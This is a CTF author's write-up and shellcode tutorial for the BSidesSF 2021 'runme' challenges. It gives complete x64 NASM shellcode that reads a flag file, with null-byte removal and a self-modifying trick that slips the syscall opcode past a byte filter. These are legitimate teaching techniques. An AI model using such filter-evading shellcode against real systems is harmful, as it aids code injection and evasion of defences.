---
id: 2496
title: 'BSidesSF CTF 2021 Author writeup / shellcode primer: Runme, Runme2, and Runme3'
date: '2021-03-14T13:48:21-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=2496'
permalink: /2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3
categories:
    - CTFs
    - Hacking
---

Hi Everybody!

This is going to be a writeup for the Runme suite of challenges from <a href="https://ctftime.org/event/1299">BSides San Francisco 2021</a>.

The three challenges I'll cover are <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme">runme</a>, <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme2">runme2</a>, and <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme3">runme3</a>, which are increasingly difficult write-shellcode challenges. As always, the binary and info the player gets is in the respective <tt>distfiles/</tt> folder, and source is in <tt>challenge/</tt>.

<!--more-->

I use the same basic code from runme for a TON of challenges, including the reverseme challenges, so definitely keep an eye out in anything else I write. :)

You can execute the binaries locally by simply running them and sending code to stdin. Or you can host it on the network using <tt>nc -e</tt> or <tt>xinetd</tt> for a more realistic setup. You can also use the Dockerfile included:
<pre>~/projects/ctf-2021-release/runme/challenge $ docker build . -t runme &amp;&amp; docker run -p1337:1337 --rm -ti runme
</pre>
My intent was to encourage players to experiment with writing shellcode, but to also make it solvable by <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">MSFVenom</a>. It turns out that at least with default settings, MSFVenom was unable to solve runme3. That made it a bit of a difficulty cliff, and I removed it from the <tt>101</tt> tag part-way through the game.
<h2>Runme</h2>
First, let's talk a second about shellcode. Shellcode refers to a self-contained chunk of code that, traditionally, spawns a shell. By "self-contained", I mean that it doesn't use any libraries or imports: it talks straight to the kernel via <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">system calls</a> (aka <em>syscalls</em>).

To perform a syscall from assembly (on x64 Linux), a syscall number is stored in <tt>rax</tt>, and arguments are loaded into several other registers (<tt>rdi</tt>, <tt>rsi</tt>, <tt>rdx</tt>, and so on - see the table above). Then the <tt>syscall</tt> instruction is invoked, which passes control over to the kernel. Behind the scenes, that's what all your favourite functions are ultimately doing, no matter which language you're using.

The most common system call folks use is <tt>exec</tt>, which opens an interactive shell (hence, "shellcode"). But personally, I like to use <tt>open</tt> to get a handle to the flag file, <tt>read</tt> to read it into a buffer, and <tt>write</tt> to write it out to stdout (and therefore to the player). I find the open/read/write style to be more versatile and easier to remember.

Here is some simple, unoptimized shellcode. I tried to comment it as best I could:
<pre id="vimCodeElement"><span class="Identifier">bits</span> <span class="Number">64</span>

<span class="Comment">;;; OPEN</span>

  <span class="Identifier">mov</span> <span class="Identifier">rax</span>, <span class="Number">2</span> <span class="Comment">; Syscall 2 = sys_open</span>
  <span class="Identifier">call</span> <span class="Identifier">getfilename</span> <span class="Comment">; Pushes the next address onto the stack and jumps down</span>
  <span class="Identifier">db</span> "/<span class="Identifier">home</span>/<span class="Identifier">ctf</span>/<span class="Identifier">flag</span><span class="Statement">.txt</span>",<span class="Number">0 </span><span class="Comment">; The literal flag, null terminated</span>
<span class="Identifier">getfilename</span>:
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span> <span class="Comment">; Pop the top of the stack (which is the filename) into rdi</span>
  <span class="Identifier">mov</span> <span class="Identifier">rsi</span>, <span class="Number">0 </span><span class="Comment">; Flags = 0</span>
  <span class="Identifier">mov</span> <span class="Identifier">rdx</span>, <span class="Number">0 </span><span class="Comment">; Mode = 0</span>
  <span class="Identifier">syscall</span> <span class="Comment">; Perform sys_open() syscall, the file handle is returned in rax</span>

<span class="Comment">;;; READ</span>

  <span class="Identifier">push</span> <span class="Identifier">rdi</span> <span class="Comment">; Temporarly store the filename pointer</span>
  <span class="Identifier">push</span> <span class="Identifier">rax</span> <span class="Comment">; Temporarily store the handle</span>

  <span class="Identifier">mov</span> <span class="Identifier">rax</span>, <span class="Number">0 </span><span class="Comment">; Syscall 0 = sys_read</span>
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span> <span class="Comment">; Move the file handle into rdi</span>
  <span class="Identifier">pop</span> <span class="Identifier">rsi</span> <span class="Comment">; Use the same buffer where the filename pointer is stored (it's readable and writable)</span>
  <span class="Identifier">mov</span> <span class="Identifier">rdx</span>, <span class="Number">30</span> <span class="Comment">; rdx is the count</span>
  <span class="Identifier">syscall</span> <span class="Comment">; Perform sys_read() syscall, reading from the opened file</span>

<span class="Comment">;;; WRITE</span>

  <span class="Identifier">mov</span> <span class="Identifier">rax</span>, <span class="Number">1</span> <span class="Comment">; Syscall 1 = sys_write</span>
  <span class="Identifier">mov</span> <span class="Identifier">rdi</span>, <span class="Number">1</span> <span class="Comment">; File handle to write to = stdout = 1</span>
  <span class="Comment">; (rsi is already the buffer)</span>
  <span class="Identifier">mov</span> <span class="Identifier">rdx</span>, <span class="Number">30</span> <span class="Comment">; rdx is the count again</span>
  <span class="Identifier">syscall</span> <span class="Comment">; Perform the sys_write syscall, writing the data to stdout</span>

<span class="Comment">;;; EXIT</span>
  <span class="Identifier">mov</span> <span class="Identifier">rax</span>, <span class="Number">60</span> <span class="Comment">; Syscall 60 = exit</span>
  <span class="Identifier">mov</span> <span class="Identifier">rdi</span>, <span class="Number">0 </span><span class="Comment">; Exit with code 0</span>
  <span class="Identifier">syscall</span> <span class="Comment">; Perform an exit</span>
</pre>
Or if you don't want to copy and paste, you can grab the file <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme/solution">from the solution folder</a>.

One of the weirdest things is that "call" business at the top. What's happening is that the <tt>call</tt> instruction pushes the next address onto the stack then jumps to the specified address. Typically you'd then use <tt>ret</tt> to return to that address, but we don't want to return to it. We want a pointer to it! So instead of consuming the address using <tt>ret</tt>, we pop it into a register to get a pointer to the flag path. This is a long-winded way to get the value of <tt>eip</tt>, the instruction pointer, which we can't normally access - it's a super common shellcoding trick, and we'll see it again on runme3 to build self-modifying code!

To run it, make sure you have a flag.txt file handy, assemble with <tt>nasm</tt>, and give it a whirl:
<pre>$ mkdir -p /home/ctf/
$ echo 'CTF{fake_flag}' &gt; /home/ctf/flag.txt
$ nasm -o solution.bin solution.asm
$ ./runme &lt; solution.bin
Send me x64!!
CTF{fake_flag}
</pre>
You can also use <tt>strace</tt> to see what's going on (or debug if something isn't working.. I did that a lot writing this blog):
<pre>$ strace ./runme &lt; solution.bin
[...]
open("/home/ctf/flag.txt", O_RDONLY)    = 3
read(3, "CTF{fake_flag}\n", 30)         = 15
write(1, "CTF{fake_flag}\ntxt\0_\276\0\0\0\0\272\0\0\0\0", 30CTF{fake_flag}
txt_) = 30
exit(0)                                 = ?
</pre>
The same four syscalls from our source! You can see that open() runs, and returns 3 (the file handle). Then read runs, using the file handle 3, and returns 15 (the length of the flag). Then write() is called, with the file descriptor set to "1", which writes to stdout. And then we exit cleanly (that's optional).
<h2>Runme2</h2>
Runme2 adds a very common restriction: no NULL bytes! It's so common, in fact, that most shellcode you can find online is already free of NULL bytes! But if you look at the code we wrote for runme1, it looks like this:
<pre>$ ndisasm -b64 solution.bin 
00000000  B802000000        mov eax,0x2
00000005  E813000000        call 0x1d
0000000A  2F                db 0x2f
0000000B  686F6D652F        push qword 0x2f656d6f
00000010  63                db 0x63
00000011  7466              jz 0x79
00000013  2F                db 0x2f
00000014  666C              o16 insb
00000016  61                db 0x61
00000017  672E7478          cs jz 0x93
0000001B  7400              jz 0x1d
0000001D  5F                pop rdi
0000001E  BE00000000        mov esi,0x0
00000023  BA00000000        mov edx,0x0
00000028  0F05              syscall
0000002A  57                push rdi
0000002B  50                push rax
0000002C  B800000000        mov eax,0x0
00000031  5F                pop rdi
00000032  5E                pop rsi
00000033  BA1E000000        mov edx,0x1e
00000038  0F05              syscall
0000003A  B801000000        mov eax,0x1
0000003F  BF01000000        mov edi,0x1
00000044  BA1E000000        mov edx,0x1e
00000049  0F05              syscall
0000004B  B83C000000        mov eax,0x3c
00000050  BF00000000        mov edi,0x0
00000055  0F05              syscall
</pre>
The middle column are the raw bytes, and there are indeed a lot of zeroes in there!

You'll also notice some weirdness starting at line 0x0000000A - that's the "/home/ctf/flag.txt" string being interpreted (incorrectly) as code. You can just ignore that.

The most complicated change we need to make is dealing with that "call" again:
<pre>00000005  E813000000        call 0x1d
</pre>
It has a bunch of 00 bytes! This is due to a weird quirk (well, a perfectly normal quirk) in x64: calls and jumps are relative, which means the machine code instructions are based on the distance being jumped. And it kinda has to be, because we have no idea where in memory we're loaded. Trying to use an absolute address would never work!

The problem here is, calls can <em>only</em> use 32-bit (4 byte) offsets! In the code above, the call jumps 0x13 bytes forward - "13 00 00 00" in little endian represents 0x00000013.

While calls are strict about using 4-byte offsets, jmp's are more flexible. A jmp can be "short", which only uses a single byte offset (which means a short jmp can only jump 127 bytes forward or 128 bytes backwards). By changing the call to a jmp, we get rid of those pesky 00's:
<pre>00000005  EB13              jmp short 0x1d
</pre>
....but, jmp doesn't push the current address onto the stack, and as discussed above, that's the whole point. Uh oh!

So we can jmp forward, but can't call forward. How do we solve that?

Simple: by calling backwards!

When you call code that's <em>above</em> your code, the offset is negative. x64, like most architectures, uses two's complement to store negative numbers. That means that negatives lead with binary 1 bits instead of binary 0 bits. So a one-byte backwards call will look like 0xFFFFFFxx instead of 0x000000xx.

That call is by far the most complicated change! The rest of the changes are just fairly simple tricks that have been well known for a long time: changing "mov REG, 0" to "xor REG, REG", for example. And, when possible, addressing 64-bit registers (like rax) using only the bottom byte (like al). All of this becomes second nature after awhile, but if you're curious to learn more I learned this from <a href="https://nostarch.com/hacking2.htm">Hacking: Art of Exploitation</a>.

Here is the code I ended up with (or you can grab it from <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme2/solution">the solution folder</a>):
<pre id="vimCodeElement"><span class="Identifier">bits</span> <span class="Number">64</span>

<span class="Comment">;;; OPEN</span>

  <span class="Comment">; Syscall 2 = sys_open</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">mov</span> <span class="Identifier">al</span>, <span class="Number">2</span>

  <span class="Comment">; rdi = filename</span>
  <span class="Identifier">jmp</span> <span class="Identifier">short</span> <span class="Identifier">getfilename_bottom</span>
<span class="Identifier">getfilename_top</span>:
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span> <span class="Comment">; Pop the top of the stack (which is the filename) into rdi</span>

  <span class="Comment">; rsi = flags</span>
  <span class="Identifier">xor</span> <span class="Identifier">rsi</span>, <span class="Identifier">rsi</span>

  <span class="Comment">; rdx = mode</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>

  <span class="Comment">; Perform sys_open() syscall, the file handle is returned in rax</span>
  <span class="Identifier">syscall</span>

<span class="Comment">;;; READ</span>

  <span class="Identifier">push</span> <span class="Identifier">rdi</span> <span class="Comment">; Temporarly store the filename pointer</span>
  <span class="Identifier">push</span> <span class="Identifier">rax</span> <span class="Comment">; Temporarily store the handle</span>

  <span class="Comment">; Syscall 0 = sys_read</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>

  <span class="Comment">; rdi = file handle</span>
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span>

  <span class="Comment">; rsi = buffer (same as filename)</span>
  <span class="Identifier">pop</span> <span class="Identifier">rsi</span>

  <span class="Comment">; rdx = count</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>
  <span class="Identifier">mov</span> <span class="Identifier">dl</span>, <span class="Number">30</span>

  <span class="Comment">; Perform sys_read() syscall, reading from the opened file</span>
  <span class="Identifier">syscall</span>

<span class="Comment">;;; WRITE</span>

  <span class="Comment">; Syscall 1 = sys_write</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">inc</span> <span class="Identifier">rax</span>

  <span class="Comment">; File handle to write to = stdout = 1</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdi</span>, <span class="Identifier">rdi</span>
  <span class="Identifier">inc</span> <span class="Identifier">rdi</span>

  <span class="Comment">; (rsi is already the buffer)</span>

  <span class="Comment">; rdx is the count again</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>
  <span class="Identifier">mov</span> <span class="Identifier">dl</span>, <span class="Number">30</span>

  <span class="Comment">; Perform the sys_write syscall, writing the data to stdout</span>
  <span class="Identifier">syscall</span>

<span class="Comment">;;; EXIT</span>
  <span class="Comment">; Syscall 60 = exit</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">mov</span> <span class="Identifier">al</span>, <span class="Number">60</span>

  <span class="Comment">; Exit with code 0</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdi</span>, <span class="Identifier">rdi</span>

  <span class="Comment">; Perform an exit</span>
  <span class="Identifier">syscall</span>

<span class="Identifier">getfilename_bottom</span>:
  <span class="Identifier">call</span> <span class="Identifier">getfilename_top</span>

  <span class="Identifier">db</span> "/<span class="Identifier">home</span>/<span class="Identifier">ctf</span>/<span class="Identifier">flag</span><span class="Statement">.txt</span>" <span class="Comment">; The literal flag, fortunately the buffer itself is null-filled so we don't need to null terminate</span>
</pre>
Let's build, then verify there are no NULL bytes:
<pre>$ nasm -o solution2.bin solution2./asm
$ ndisasm -b64 solution2.bin
00000000  4831C0            xor rax,rax
00000003  B002              mov al,0x2
00000005  EB34              jmp short 0x3b
00000007  5F                pop rdi
00000008  4831F6            xor rsi,rsi
0000000B  4831D2            xor rdx,rdx
0000000E  0F05              syscall
00000010  57                push rdi
00000011  50                push rax
00000012  4831C0            xor rax,rax
00000015  5F                pop rdi
00000016  5E                pop rsi
00000017  4831D2            xor rdx,rdx
0000001A  B21E              mov dl,0x1e
0000001C  0F05              syscall
0000001E  4831C0            xor rax,rax
00000021  48FFC0            inc rax
00000024  4831FF            xor rdi,rdi
00000027  48FFC7            inc rdi
0000002A  4831D2            xor rdx,rdx
0000002D  B21E              mov dl,0x1e
0000002F  0F05              syscall
00000031  4831C0            xor rax,rax
00000034  B03C              mov al,0x3c
00000036  4831FF            xor rdi,rdi
00000039  0F05              syscall
0000003B  E8C7FFFFFF        call 0x7
00000040  2F                db 0x2f
00000041  686F6D652F        push qword 0x2f656d6f
00000046  63                db 0x63
00000047  7466              jz 0xaf
00000049  2F                db 0x2f
0000004A  666C              o16 insb
0000004C  61                db 0x61
0000004D  672E7478          cs jz 0xc9
00000051  74                db 0x74
</pre>
Notice how the call function is now padded with FF bytes? That's what I was explaining above about a negative offset:
<pre>0000003B  E8C7FFFFFF        call 0x7
</pre>
And, of course, validate that it still works:
<pre>$ nasm -o solution2.bin solution2.asm
$ ./runme2 &lt; ./solution2.bin 
Send me x64!! No nulls, plz
CTF{fake_flag}
</pre>
<h2>Runme3</h2>
This is where it actually gets really hard. In addition to disallowing NULL bytes, I also disallow the bytes required for <tt>syscall</tt>, which also apparently breaks MSFVenom's encoder!

Typically, the syscall instruction is 0F 05:
<pre>00000039  0F05              syscall
</pre>
But those exact bytes aren't allowed! How do you get around THAT restriction?

There are many ways, and the most common way is to use an encoder. And encoder basically XORs each byte with a set value, which changes it to something else. At the start of the shellcode, you XOR by that value again, and voila! You have the original code back! That's called an encoder, and is often used for hiding malicious payloads. But we can do something a bit easier (or harder, I dunno).

The way I solved that was to put the syscall bytes, minus one, at the bottom of the code, the same way I put the flag path there, followed by a return instruction. It's a mini encoded function! Then I get a pointer to it using the same jmp/call/pop trick from earlier, and add 1 to each byte. That gives me a very small function I can call that simply performs a syscall.

This is technically "self modifying code", or maybe even "polymorphic shellcode", to use a fancy name. But it's the simplest version of it I could think of.

Let's take a look at <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/runme3/solution">the solution</a>:
<pre id="vimCodeElement"><span class="Identifier">bits</span> <span class="Number">64</span>

<span class="Comment">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span>
<span class="Identifier">jmp</span> <span class="Identifier">short</span> <span class="Identifier">my_fake_syscall_bottom</span>
  <span class="Identifier">my_fake_syscall_top</span>:
  <span class="Identifier">pop</span> <span class="Identifier">rbx</span> <span class="Comment">; Pop the address of the syscall-minus-1 block into rbx</span>
  <span class="Identifier">add</span> <span class="Identifier">word</span> [<span class="Identifier">rbx</span>], <span class="Number">0x0101</span> <span class="Comment">; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span>

  <span class="Comment">; Now rbx points to "syscall / ret", so we can just call that any time we</span>
  <span class="Comment">; need a syscall!</span>
  <span class="Comment">;</span>
  <span class="Comment">; Other than changing "syscall" to "call rbx", the rest is identical!</span>

<span class="Comment">;;; OPEN</span>

  <span class="Comment">; Syscall 2 = sys_open</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">mov</span> <span class="Identifier">al</span>, <span class="Number">2</span>

  <span class="Comment">; rdi = filename</span>
  <span class="Identifier">jmp</span> <span class="Identifier">short</span> <span class="Identifier">getfilename_bottom</span>
<span class="Identifier">getfilename_top</span>:
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span> <span class="Comment">; Pop the top of the stack (which is the filename) into rdi</span>

  <span class="Comment">; rsi = flags</span>
  <span class="Identifier">xor</span> <span class="Identifier">rsi</span>, <span class="Identifier">rsi</span>

  <span class="Comment">; rdx = mode</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>

  <span class="Comment">; Perform sys_open() syscall, the file handle is returned in rax</span>
  <span class="Identifier">call</span> <span class="Identifier">rbx</span>

<span class="Comment">;;; READ</span>

  <span class="Identifier">push</span> <span class="Identifier">rdi</span> <span class="Comment">; Temporarly store the filename pointer</span>
  <span class="Identifier">push</span> <span class="Identifier">rax</span> <span class="Comment">; Temporarily store the handle</span>

  <span class="Comment">; Syscall 0 = sys_read</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>

  <span class="Comment">; rdi = file handle</span>
  <span class="Identifier">pop</span> <span class="Identifier">rdi</span>

  <span class="Comment">; rsi = buffer (same as filename)</span>
  <span class="Identifier">pop</span> <span class="Identifier">rsi</span>

  <span class="Comment">; rdx = count</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>
  <span class="Identifier">mov</span> <span class="Identifier">dl</span>, <span class="Number">30</span>

  <span class="Comment">; Perform sys_read() syscall, reading from the opened file</span>
  <span class="Identifier">call</span> <span class="Identifier">rbx</span>

<span class="Comment">;;; WRITE</span>

  <span class="Comment">; Syscall 1 = sys_write</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">inc</span> <span class="Identifier">rax</span>

  <span class="Comment">; File handle to write to = stdout = 1</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdi</span>, <span class="Identifier">rdi</span>
  <span class="Identifier">inc</span> <span class="Identifier">rdi</span>

  <span class="Comment">; (rsi is already the buffer)</span>

  <span class="Comment">; rdx is the count again</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdx</span>, <span class="Identifier">rdx</span>
  <span class="Identifier">mov</span> <span class="Identifier">dl</span>, <span class="Number">30</span>

  <span class="Comment">; Perform the sys_write syscall, writing the data to stdout</span>
  <span class="Identifier">call</span> <span class="Identifier">rbx</span>

<span class="Comment">;;; EXIT</span>
  <span class="Comment">; Syscall 60 = exit</span>
  <span class="Identifier">xor</span> <span class="Identifier">rax</span>, <span class="Identifier">rax</span>
  <span class="Identifier">mov</span> <span class="Identifier">al</span>, <span class="Number">60</span>

  <span class="Comment">; Exit with code 0</span>
  <span class="Identifier">xor</span> <span class="Identifier">rdi</span>, <span class="Identifier">rdi</span>

  <span class="Comment">; Perform an exit</span>
  <span class="Identifier">call</span> <span class="Identifier">rbx</span>

<span class="Identifier">my_fake_syscall_bottom</span>:
  <span class="Identifier">call</span> <span class="Identifier">my_fake_syscall_top</span>

  <span class="Comment">; This little block will become "syscall / ret"</span>
  <span class="Identifier">db</span> <span class="Number">0x0e</span>, <span class="Number">0x04</span> <span class="Comment">; syscall is actually 0x0f 0x05</span>
  <span class="Identifier">ret</span> <span class="Comment">; Return after doing a syscall</span>


<span class="Identifier">getfilename_bottom</span>:
  <span class="Identifier">call</span> <span class="Identifier">getfilename_top</span>

  <span class="Identifier">db</span> "/<span class="Identifier">home</span>/<span class="Identifier">ctf</span>/<span class="Identifier">flag</span><span class="Statement">.txt</span>" <span class="Comment">; The literal flag, fortunately the buffer itself is null-filled so we don't need to null terminate</span>
</pre>
And, of course, validate it works:
<pre>$ nasm -o solution3.bin solution3.asm
$ ./runme3 &lt; solution3.bin
Send me x64!! No nulls, plz. Also no 0xcd, 0x80, 0x0f, or 0x05.
CTF{fake_flag}
</pre>
<h2>Conclusion</h2>
Hopefully that makes sense! I know that self re-writing code is far tricker than the rest, but hopefully it's not too crazy! I really didn't mean the difficulty ramp to be that steep, but next year I'm definitely going to do a much, much gentler difficulty slope :)